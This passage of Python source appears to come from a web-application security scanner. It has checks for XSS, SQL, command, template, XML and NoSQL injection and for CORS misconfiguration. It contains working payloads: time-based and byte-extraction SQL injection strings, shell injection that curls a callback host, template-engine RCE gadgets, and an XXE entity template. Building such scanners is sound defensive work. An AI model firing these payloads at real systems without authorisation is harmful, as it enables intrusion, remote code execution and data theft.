      2. Any candidate is handed to a real headless browser with a
         callback payload — a collaborator hit is proof the JS actually
         ran (CONFIRMED); no hit downgrades to FAIL ("reflected but not
         proven executable"), never silently dropped.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id
    marker = canary()
    payload = f'"><dastxss id="{marker}">probe</dastxss>'

    query_params = list(parse_qs(urlsplit(target_url).query).keys())
    if not query_params:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL has no query parameters to test for reflection",
            confidence=0.15,
        )

    observed_response = False
    for param in query_params:
        try:
            resp = await session.request("GET", target_url, params={param: payload})
        except Exception:
            continue
        if resp.status_code == 404:
            continue
        observed_response = True
        content_type = resp.headers.get("content-type", "")
        if not canary_reflected_unescaped(marker, resp.text, content_type):
            continue

        confirmed, exec_proof, reproduction = await _confirm_reflected_xss_execution(
            target_url, param, collaborator,
        )
        if confirmed:
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id, severity=rule.severity,
                url=str(resp.request.url), method="GET",
                note=f"Marker payload reflected in a dangerous (executable) context via query param "
                     f"'{param}', and a headless browser confirmed it actually executes — the injected "
                     f"script called back out-of-band on page load",
                confidence=0.95, evidence_type="js_execution",
                payload=session.redact(payload), proof=exec_proof, reproduction=reproduction,
            )
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=str(resp.request.url), method="GET",
            note=f"Marker payload reflected unescaped in a dangerous context (script/event-handler/"
                 f"unquoted-attribute/raw-tag) via query param '{param}', but headless-browser execution "
                 f"could not be confirmed — {exec_proof.get('reason', 'no out-of-band callback observed')}",
            confidence=0.7, evidence_type="reflection", payload=session.redact(payload),
            proof=_response_proof(session, resp, marker=marker, param=param),
        )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No query parameter reflected the marker payload in a dangerous (executable) context",
            confidence=0.5, payload=session.redact(payload), evidence_type="reflection",
            proof=_response_proof(session, resp, marker=marker, last_param_tried=param),
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any of its own query parameters", confidence=0.2,
    )


# DB-agnostic time-based blind payload variants — same "<value>' AND
# SLEEP(5)-- -"-shape idea, one per major engine's own delay primitive.
# Tried in order, first one timing_oracle confirms wins; none require
# knowing the real engine up front, same "don't guess, just try"
# philosophy as the boolean-blind first pass above.
_TIME_BASED_SQLI_PAYLOAD_BUILDERS = (
    ("mysql_sleep", lambda value, delay: f"{value}' AND SLEEP({delay})-- -"),
    ("postgres_pg_sleep", lambda value, delay: f"{value}' AND pg_sleep({delay})-- -"),
    ("mssql_waitfor", lambda value, delay: f"{value}'; WAITFOR DELAY '0:0:{delay}'-- -"),
    ("oracle_dbms_pipe", lambda value, delay: f"{value}' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('DAST',{delay})-- -"),
)

# The expression each dialect uses to read its own version string — only
# the three engines where a single-quoted, single-row boolean context can
# read it back byte-by-byte in the same shape as the boolean-blind first
# pass. Oracle's dbms_pipe timing primitive above doesn't have an
# equivalent single-expression substring read, so it's confirmed via
# timing alone, without the extraction step.
_VERSION_EXPR_BY_DIALECT = {
    "mysql_sleep": "@@version",
    "postgres_pg_sleep": "version()",
    "mssql_waitfor": "@@version",
}


async def _escalate_sql_injection_to_confirmed(
    session: DastSession, target_url: str, param: str, original_value: str,
) -> Tuple[bool, dict, Optional[str]]:
    """Phase 2.1 confirmation escalation, run only after a boolean/error
    signal already fired (a plain FAIL). Two steps:
      1. Time-based blind via oracles.timing_oracle, tried across
         _TIME_BASED_SQLI_PAYLOAD_BUILDERS' DB-agnostic variants — the
         first one whose injected delay is genuinely, measurably slower
         than baseline (not just noise) confirms the engine actually
         executes the injected SQL, not just tolerates a stray quote.
      2. A single-byte boolean-blind extraction of the DB version string's
         first character — the "successfully penetrate" step: proves real
         data egress, not just a timing side channel. Best-effort; a
         confirmed timing signal alone is already enough for CONFIRMED,
         extraction only upgrades the reproduction string when it succeeds.
    """
    for dialect, build_payload in _TIME_BASED_SQLI_PAYLOAD_BUILDERS:
        async def _send(delay_seconds: int, _build=build_payload) -> None:
            payload = _build(original_value, delay_seconds)
            try:
                await session.request("GET", target_url, params={param: payload})
            except Exception:
                pass  # timing_oracle only measures wall-clock around this call

        confirmed, timing_proof = await timing_oracle(_send, injected_delay=5, samples=3)
        if not confirmed:
            continue

        proof = {
            "true_ms": timing_proof["injected_median_ms"],
            "false_ms": timing_proof["baseline_median_ms"],
            "dialect": dialect,
            "delta_ms": timing_proof["delta_ms"],
        }
        reproduction_payload = build_payload(original_value, 5)
        reproduction_url = _build_url_with_param(target_url, param, reproduction_payload)
        reproduction = f"curl -s '{reproduction_url}'  # response should be delayed ~5s"

        extracted = await _extract_one_byte(session, target_url, param, original_value, dialect)
        if extracted is not None:
            char, extraction_url = extracted
            proof["extracted_byte"] = char
            reproduction = f"curl -s '{extraction_url}'  # proves data egress: version()[0] == {char!r}"

        return True, proof, reproduction

    return False, {}, None


async def _extract_one_byte(
    session: DastSession, target_url: str, param: str, original_value: str, dialect: str,
) -> Optional[Tuple[str, str]]:
    """Boolean-blind single-character extraction — binary-searches the
    ASCII code of the DB version string's first character over the
    printable range (32-126, ~7 requests) using the same response-size
    response_diff_oracle heuristic the boolean-blind first pass already
    established, just repeated against a narrowing numeric condition
    instead of a fixed true/false pair. Returns (character, the exact
    request URL that proved it) or None if this dialect has no supported
    version expression, a request fails, or the final equality check
    doesn't reproduce a true-shaped response (inconclusive — never report
    a byte that isn't actually confirmed)."""
    version_expr = _VERSION_EXPR_BY_DIALECT.get(dialect)
    if version_expr is None:
        return None

    false_payload = f"{original_value}' AND ASCII(SUBSTRING({version_expr},1,1))>255-- -"
    try:
        false_resp = await session.request("GET", target_url, params={param: false_payload})
    except Exception:
        return None

    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"{original_value}' AND ASCII(SUBSTRING({version_expr},1,1))>{mid}-- -"
        try:
            resp = await session.request("GET", target_url, params={param: payload})
        except Exception:
            return None
        if response_diff_oracle(resp.text, false_resp.text):
            lo = mid + 1
        else:
            hi = mid

    extracted_char = chr(lo)
    equality_payload = f"{original_value}' AND SUBSTRING({version_expr},1,1)='{extracted_char}'-- -"
    try:
        confirm_resp = await session.request("GET", target_url, params={param: equality_payload})
    except Exception:
        return None
    if not response_diff_oracle(confirm_resp.text, false_resp.text):
        return None
    return extracted_char, str(confirm_resp.request.url)


async def _check_sql_injection(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Track A3 — V1.2.4. Same reasoning as REFLECTED_XSS_LIVE for why this
    only tests params the URL already carries rather than guessing common
    names: SQLi has no small fixed universe of semantically-meaningful
    param names either.

    Two first-pass signals, checked per candidate param (both stay FAIL —
    a strong heuristic, not yet reproduced impact):
      1. Error-based (strong): a single quote reaching a query un-escaped
         often surfaces the DB driver's own syntax-error text verbatim.
      2. Boolean-blind (weaker): "<value>' OR '1'='1" (always-true) vs.
         "<value>' OR '1'='2" (always-false) appended to the existing
         value — a real, unparameterized query returns visibly different
         result sets for the two; a safely-parameterized one treats both
         as the same literal string and returns identical responses.

    Phase 2.1: either signal firing escalates to
    _escalate_sql_injection_to_confirmed — time-based blind confirmation
    plus a single-byte extraction as final proof of real data egress. A
    confirmed escalation upgrades the verdict to CONFIRMED; an
    unconfirmed one leaves the original FAIL exactly as it was (the
    heuristic signal is still real evidence even when this particular
    target doesn't happen to be timing-provable).

    requires_active_mode in dynamic_queries.json: unlike the read-only
    REFLECTED_XSS_LIVE, these payloads reach a real query — on a
    write-context param (not just SELECT-shaped ones) that's a real
    state-changing risk, same class as CSRF_TOKEN_NOT_VALIDATED.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    query_params = parse_qs(urlsplit(target_url).query)
    if not query_params:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL has no query parameters to test", confidence=0.15,
        )

    observed_response = False
    for param, values in query_params.items():
        original_value = values[0] if values else ""
        true_value = f"{original_value}' OR '1'='1"
        false_value = f"{original_value}' OR '1'='2"

        try:
            true_resp = await session.request("GET", target_url, params={param: true_value})
            false_resp = await session.request("GET", target_url, params={param: false_value})
        except Exception:
            continue
        if true_resp.status_code == 404 and false_resp.status_code == 404:
            continue
        observed_response = True

        if error_signature_oracle(true_resp.text) or error_signature_oracle(false_resp.text):
            confirmed, proof, reproduction = await _escalate_sql_injection_to_confirmed(
                session, target_url, param, original_value,
            )
            if confirmed:
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id, severity=rule.severity,
                    url=str(true_resp.request.url), method="GET",
                    note=f"Query param '{param}': error-based signal escalated and confirmed via "
                         f"time-based blind injection — the database measurably executed the injected "
                         f"delay, and a boolean-blind byte extraction proved real data egress",
                    confidence=0.95, evidence_type="time_delay",
                    payload=session.redact(true_value), proof=proof, reproduction=reproduction,
                )
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                url=str(true_resp.request.url), method="GET",
                note=f"A single-quote-bearing payload in query param '{param}' produced a response "
                     f"containing database error text — the value reaches a query unescaped",
                confidence=0.75, evidence_type="error_signature", payload=session.redact(true_value),
                proof=_response_proof(session, true_resp, param=param),
            )

        if (
            true_resp.status_code == false_resp.status_code
            and response_diff_oracle(true_resp.text, false_resp.text)
        ):
            confirmed, proof, reproduction = await _escalate_sql_injection_to_confirmed(
                session, target_url, param, original_value,
            )
            if confirmed:
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id, severity=rule.severity,
                    url=str(true_resp.request.url), method="GET",
                    note=f"Query param '{param}': boolean-diff signal escalated and confirmed via "
                         f"time-based blind injection — the database measurably executed the injected "
                         f"delay, and a boolean-blind byte extraction proved real data egress",
                    confidence=0.95, evidence_type="time_delay",
                    payload=session.redact(true_value), proof=proof, reproduction=reproduction,
                )
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                url=str(true_resp.request.url), method="GET",
                note=f"Query param '{param}': an always-true and an always-false SQL boolean appended "
                     f"to the same value produced visibly different responses (same status "
                     f"{true_resp.status_code}, body lengths {len(true_resp.text)} vs "
                     f"{len(false_resp.text)}) — evidence the value reaches an unparameterized query "
                     f"(a single test run; not a confirmed exploit chain)",
                confidence=0.55, evidence_type="response_diff", payload=session.redact(true_value),
                proof={
                    "true_payload_status": true_resp.status_code, "false_payload_status": false_resp.status_code,
                    "true_response_snippet": session.redact(true_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                    "false_response_snippet": session.redact(false_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                    "param": param,
                },
            )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No query parameter showed a SQL error or a true/false boolean response difference",
            confidence=0.45, payload=session.redact(true_value), evidence_type="response_diff",
            proof={
                "true_payload_status": true_resp.status_code, "false_payload_status": false_resp.status_code,
                "true_response_snippet": session.redact(true_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                "false_response_snippet": session.redact(false_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                "last_param_tried": param,
            },
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any of its own query parameters", confidence=0.2,
    )


_CMD_INJECTION_DELIMITERS = (
    ("semicolon", lambda cmd: f"; {cmd}"),
    ("pipe", lambda cmd: f"| {cmd}"),
    ("backtick", lambda cmd: f"`{cmd}`"),
    ("dollar_paren", lambda cmd: f"$({cmd})"),
)


async def _check_command_injection(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V1.2.5 blind OS command injection. Same reasoning as
    REFLECTED_XSS_LIVE/SQL_INJECTION_LIVE for testing only params the URL
    already carries: no small fixed candidate-name universe exists here
    either.

    No in-band heuristic exists for a *blind* command injection — unlike
    SQL_INJECTION_LIVE's error-message/boolean-diff signals, a shell
    command's own output rarely reaches the HTTP response at all. The only
    first-pass signal is behavioral: oracles.timing_oracle confirms one of
    four shell-delimiter variants (;, |, backtick, $()) measurably delays
    the response when appended with a sleep command (FAIL). If a
    collaborator is available, escalates with the same delimiter shape
    curling the collaborator URL — a callback is direct proof the shell
    actually executed the injected command (CONFIRMED,
    evidence_type="oob_callback"), not just that *something* got slower.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    query_params = parse_qs(urlsplit(target_url).query)
    if not query_params:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL has no query parameters to test", confidence=0.15,
        )

    observed_response = False
    for param, values in query_params.items():
        original_value = values[0] if values else ""

        try:
            baseline_resp = await session.request("GET", target_url, params={param: original_value})
        except Exception:
            continue
        if baseline_resp.status_code == 404:
            continue
        observed_response = True

        winning_delimiter = None
        winning_proof = {}
        for delim_name, build in _CMD_INJECTION_DELIMITERS:
            async def _send(delay_seconds: int, _build=build) -> None:
                payload = f"{original_value}{_build(f'sleep {delay_seconds}')}"
                try:
                    await session.request("GET", target_url, params={param: payload})
                except Exception:
                    pass

            confirmed, proof = await timing_oracle(_send, injected_delay=5, samples=3)
            if confirmed:
                winning_delimiter = (delim_name, build)
                winning_proof = proof
                break

        if winning_delimiter is None:
            continue

        delim_name, build = winning_delimiter
        sleep_payload = f"{original_value}{build('sleep 5')}"

        if collaborator is not None:
            token = collaborator.new_token()
            callback_url = collaborator.callback_url(token)
            oob_payload = f"{original_value}{build(f'curl {callback_url}')}"
            try:
                await session.request("GET", target_url, params={param: oob_payload})
            except Exception:
                pass
            await asyncio.sleep(2.0)
            oob_confirmed, oob_proof = oob_oracle(collaborator, token)
            if oob_confirmed:
                reproduction_url = _build_url_with_param(target_url, param, oob_payload)
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id, severity=rule.severity,
                    url=str(baseline_resp.request.url), method="GET",
                    note=f"Query param '{param}': a {delim_name}-delimited timing signal escalated and "
                         f"confirmed via an out-of-band curl callback — the injected shell command "
                         f"actually executed and reached the collaborator",
                    confidence=0.95, evidence_type="oob_callback",
                    payload=session.redact(oob_payload), proof=oob_proof,
                    reproduction=f"curl -s '{reproduction_url}'",
                )

        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=str(baseline_resp.request.url), method="GET",
            note=f"Query param '{param}': a {delim_name}-delimited sleep payload measurably delayed the "
                 f"response relative to a stable baseline — evidence of blind command execution "
                 f"(out-of-band callback could not confirm actual execution)",
            confidence=0.7, evidence_type="time_delay",
            payload=session.redact(sleep_payload), proof=winning_proof,
        )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No query parameter showed a measurable timing difference for any shell-delimiter variant",
            confidence=0.4, evidence_type="time_delay",
            proof=_response_proof(session, baseline_resp, last_param_tried=param),
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any of its own query parameters", confidence=0.2,
    )


def _ssti_arithmetic_polyglot() -> Tuple[str, int, int, int]:
    """A triple polyglot ({{a*b}}${a*b}<%= a*b %>) covering Jinja2/
    Twig-ish, JSP-EL/Freemarker-ish, and ERB/JSP-scriptlet-ish syntax in
    one payload — whichever (if any) the underlying template engine
    honors, the product shows up in the response. A random large product
    (100-999 * 100-999) rather than a fixed one like 7*7=49 makes a
    coincidental match in an unmodified baseline vanishingly unlikely."""
    a = secrets.randbelow(900) + 100
    b = secrets.randbelow(900) + 100
    product = a * b
    payload = "{{" + f"{a}*{b}" + "}}" + "${" + f"{a}*{b}" + "}" + "<%= " + f"{a}*{b}" + " %>"
    return payload, a, b, product


# Known SSTI-to-RCE gadgets, one per major template engine — each curls the
# collaborator URL if the engine actually evaluates the injected syntax as
# code rather than just interpolating text. Representative, well-known
# payload shapes (OWASP SSTI cheatsheet class), not guaranteed to work
# against every engine version — same "good enough heuristic" posture as
# every other payload in this module.
_SSTI_RCE_GADGETS = (
    ("jinja2", lambda url: (
        "{{ self.__init__.__globals__.__builtins__.__import__('os')"
        ".popen('curl " + url + "').read() }}"
    )),
    ("twig", lambda url: "{{ ['curl " + url + "']|filter('system') }}"),
    ("freemarker", lambda url: (
        '<#assign ex="freemarker.template.utility.Execute"?new()>'
        '${ex("curl ' + url + '")}'
    )),
)


async def _check_ssti(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V1.3.2 server-side template injection. Same reasoning as
    every other param-dependent check here for why it only tests params
    the URL already carries.

    Two stages:
      1. _ssti_arithmetic_polyglot's product appearing in the response,
         but *not* in an unmodified baseline (rules out a number that
         just happened to already be on the page), is evidence the
         template engine evaluates injected syntax (FAIL,
         evidence_type="response_diff").
      2. If a collaborator is available, tries known Jinja2/Twig/
         Freemarker RCE gadgets (_SSTI_RCE_GADGETS) that curl the
         collaborator URL — a callback is reproduced impact (CONFIRMED,
         evidence_type="oob_callback"), not just template evaluation.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    query_params = parse_qs(urlsplit(target_url).query)
    if not query_params:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL has no query parameters to test", confidence=0.15,
        )

    observed_response = False
    for param, values in query_params.items():
        original_value = values[0] if values else ""

        try:
            baseline_resp = await session.request("GET", target_url, params={param: original_value})
        except Exception:
            continue
        if baseline_resp.status_code == 404:
            continue
        observed_response = True

        polyglot, a, b, product = _ssti_arithmetic_polyglot()
        product_str = str(product)
        if product_str in baseline_resp.text:
            continue  # already on the page unmodified — not a usable signal

        try:
            arith_resp = await session.request(
                "GET", target_url, params={param: f"{original_value}{polyglot}"},
            )
        except Exception:
            continue
        if product_str not in arith_resp.text:
            continue

        if collaborator is not None:
            for engine, build_gadget in _SSTI_RCE_GADGETS:
                token = collaborator.new_token()
                callback_url = collaborator.callback_url(token)
                gadget_payload = f"{original_value}{build_gadget(callback_url)}"
                try:
                    await session.request("GET", target_url, params={param: gadget_payload})
                except Exception:
                    continue
                await asyncio.sleep(2.0)
                confirmed, proof = oob_oracle(collaborator, token)
                if confirmed:
                    reproduction_url = _build_url_with_param(target_url, param, gadget_payload)
                    return DynamicFinding(
                        control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id,
                        severity=rule.severity, url=str(arith_resp.request.url), method="GET",
                        note=f"Query param '{param}': arithmetic polyglot evaluated ({a}*{b}={product} "
                             f"appeared in the response), escalated and confirmed via a {engine} RCE "
                             f"gadget that called back the collaborator out-of-band",
                        confidence=0.95, evidence_type="oob_callback",
                        payload=session.redact(gadget_payload), proof=proof,
                        reproduction=f"curl -s '{reproduction_url}'",
                    )

        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=str(arith_resp.request.url), method="GET",
            note=f"Query param '{param}': an arithmetic polyglot payload was evaluated server-side "
                 f"({a}*{b}={product} appeared in the response but not in an unmodified baseline) — "
                 f"evidence the value reaches a template engine (RCE gadget escalation did not confirm "
                 f"code execution)",
            confidence=0.7, evidence_type="response_diff", payload=session.redact(polyglot),
            proof=_response_proof(session, arith_resp, baseline_snippet=baseline_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS], expected_product=product_str, param=param),
        )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No query parameter evaluated the arithmetic polyglot payload",
            confidence=0.45, evidence_type="response_diff",
            proof=_response_proof(session, baseline_resp, last_param_tried=param),
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any of its own query parameters", confidence=0.2,
    )


_XXE_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE data [<!ENTITY xxe SYSTEM "{callback_url}">]>\n'
    '<data>&xxe;</data>'
)


async def _check_xxe(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V1.5.1 XML external entity injection. Unlike every other
    check in this module, this isn't param-dependent at all — it POSTs a
    whole XML document as the request body and doesn't touch target_url's
    query string. There's no in-band signal for a *blind* XXE (the entity
    resolves server-side; nothing about that necessarily reaches the HTTP
    response) — the only signal is out-of-band, so this check is entirely
    collaborator-gated: NOT_TESTED without one, never a guess.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    if collaborator is None:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="POST",
            note="No out-of-band collaborator configured for this scan — a blind XXE has no in-band "
                 "signal, so there's nothing to confirm this against",
            confidence=0.15,
        )

    token = collaborator.new_token()
    callback_url = collaborator.callback_url(token)
    payload = _XXE_PAYLOAD_TEMPLATE.format(callback_url=callback_url)

    try:
        resp = await session.request(
            "POST", target_url, content=payload.encode("utf-8"),
            headers={"Content-Type": "application/xml"},
        )
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="POST",
            note=f"Request failed: {session.redact(str(exc))}", confidence=0.2,
        )
    if resp.status_code == 404:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="POST",
            note="Endpoint returned 404 for an XML POST body — nothing here to test",
            confidence=0.2,
        )

    await asyncio.sleep(2.0)
    confirmed, proof = oob_oracle(collaborator, token)
    if confirmed:
        reproduction = (
            f"curl -s -X POST '{target_url}' -H 'Content-Type: application/xml' "
            f"--data-binary '{payload}'"
        )
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.CONFIRMED, rule_id=rule.rule_id, severity=rule.severity,
            url=str(resp.request.url), method="POST",
            note="Posting an external-entity XML payload caused the target to fetch the injected "
                 "collaborator URL — confirmed out-of-band; the XML parser resolves external entities",
            confidence=0.9, evidence_type="oob_callback",
            payload=session.redact(payload), proof=proof, reproduction=reproduction,
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
        url=str(resp.request.url), method="POST",
        note="No out-of-band callback was observed after posting an external-entity XML payload "
             "(the endpoint may not parse XML at all, or its parser disables external entities)",
        confidence=0.35, payload=session.redact(payload), evidence_type="oob_callback",
        proof=_response_proof(session, resp, callback_token=token),
    )


# Bracket-notation is the closest a query string (no literal null/object
# support) can get to {"$ne": null} / {"$gt": ""} — the shape several
# frameworks (Express+qs, PHP) parse into a nested filter object.
_NOSQL_OPERATOR_PAYLOADS = (
    ("ne_empty", "$ne", ""),
    ("gt_empty", "$gt", ""),
)


async def _check_nosql_injection(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V1.2.4 NoSQL (MongoDB-style) operator injection. Same
    query-param-only reasoning as SQL_INJECTION_LIVE.

    Boolean-blind only, same weaker signal as SQL_INJECTION_LIVE's
    always-true/always-false comparison: an operator payload's response is
    compared against a definite-non-match literal control value via
    oracles.response_diff_oracle. A visible difference is evidence the
    param reaches an unsanitized filter. No escalation path is defined for
    this class here, so it stays FAIL rather than reaching CONFIRMED.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    query_params = parse_qs(urlsplit(target_url).query)
    if not query_params:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="URL has no query parameters to test", confidence=0.15,
        )

    observed_response = False
    for param in query_params:
        base_url = _url_without_param(target_url, param)
        control_value = f"dast-nosql-{secrets.token_hex(4)}"

        try:
            control_resp = await session.request("GET", base_url, params={param: control_value})
        except Exception:
            continue
        if control_resp.status_code == 404:
            continue
        observed_response = True

        for op_name, op_key, op_value in _NOSQL_OPERATOR_PAYLOADS:
            operator_param = f"{param}[{op_key}]"
            try:
                bypass_resp = await session.request("GET", base_url, params={operator_param: op_value})
            except Exception:
                continue
            if (
                bypass_resp.status_code == control_resp.status_code
                and response_diff_oracle(bypass_resp.text, control_resp.text)
            ):
                return DynamicFinding(
                    control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
                    url=str(bypass_resp.request.url), method="GET",
                    note=f"Query param '{param}': a MongoDB operator-injection payload ({operator_param}) "
                         f"produced a visibly different response than a definite-non-match control value "
                         f"(same status {bypass_resp.status_code}, body lengths "
                         f"{len(bypass_resp.text)} vs {len(control_resp.text)}) — evidence the value "
                         f"reaches an unsanitized NoSQL query filter (a single test run; not a confirmed "
                         f"exploit chain)",
                    confidence=0.55, evidence_type="response_diff", payload=session.redact(operator_param),
                    proof={
                        "control_status": control_resp.status_code, "bypass_status": bypass_resp.status_code,
                        "control_response_snippet": session.redact(control_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                        "bypass_response_snippet": session.redact(bypass_resp.text[:_UNAUTH_RESPONSE_SNIPPET_CHARS]),
                        "operator_param": operator_param,
                    },
                )

    if observed_response:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.PASS, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="No query parameter showed a boolean response difference for any operator-injection payload",
            confidence=0.45, evidence_type="response_diff",
            proof=_response_proof(session, control_resp, last_param_tried=param),
        )
    return DynamicFinding(
        control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
        url=target_url, method="GET",
        note="Could not reach the target with any of its own query parameters", confidence=0.2,
    )


_CORS_PROBE_ORIGIN = "https://dast-cors-probe.invalid"


async def _check_cors_misconfiguration(
    session: DastSession, target_url: str, rule: DynamicQueryRule,
    *, collaborator: Optional[CollaboratorServer] = None,
) -> DynamicFinding:
    """Phase 3 — V3.4.2 CORS misconfiguration. Cheap and read-only (a
    single GET with a crafted Origin header) — not gated behind
    active_mode, same class as OPEN_REDIRECT_LIVE/REFLECTED_XSS_LIVE.
    Reflecting an arbitrary origin back in Access-Control-Allow-Origin
    combined with Access-Control-Allow-Credentials: true is the actual
    exploitable combination (any origin can make credentialed cross-site
    requests and read the response) — not just *a* CORS header being
    present.
    """
    control_id = rule.asvs_controls[0] if rule.asvs_controls else rule.rule_id

    try:
        resp = await session.request("GET", target_url, headers={"Origin": _CORS_PROBE_ORIGIN})
    except Exception as exc:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note=f"Request failed: {session.redact(str(exc))}", confidence=0.2,
        )
    if resp.status_code == 404:
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.NOT_TESTED, rule_id=rule.rule_id, severity=rule.severity,
            url=target_url, method="GET",
            note="Endpoint returned 404 — nothing here to test", confidence=0.2,
        )

    acao = resp.headers.get("access-control-allow-origin", "")
    acac = resp.headers.get("access-control-allow-credentials", "").strip().lower() == "true"
    cors_proof = _response_proof(session, resp, probe_origin=_CORS_PROBE_ORIGIN, acao=acao, acac=acac)

    if acao == _CORS_PROBE_ORIGIN:
        if acac:
            return DynamicFinding(
                control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity="high",
                url=str(resp.request.url), method="GET",
                note=f"Response reflected an arbitrary Origin ({_CORS_PROBE_ORIGIN}) back in "
                     f"Access-Control-Allow-Origin *and* set Access-Control-Allow-Credentials: true — "
                     f"any origin can make credentialed cross-site requests and read the response",
                confidence=0.85, evidence_type="reflection", proof=cors_proof,
            )
        return DynamicFinding(
            control_id=control_id, verdict=Verdict.FAIL, rule_id=rule.rule_id, severity=rule.severity,
            url=str(resp.request.url), method="GET",
            note=f"Response reflected an arbitrary Origin ({_CORS_PROBE_ORIGIN}) back in "
                 f"Access-Control-Allow-Origin without Allow-Credentials — any origin can read "
                 f"non-credentialed responses",
            confidence=0.6, evidence_type="reflection", proof=cors_proof,
        )

    if acao == "*" and acac:
        # Technically invalid per the Fetch spec (browsers reject
        # wildcard+credentials), but still worth flagging — some
        # proxies/frameworks let the combination through anyway.
        return DynamicFinding(
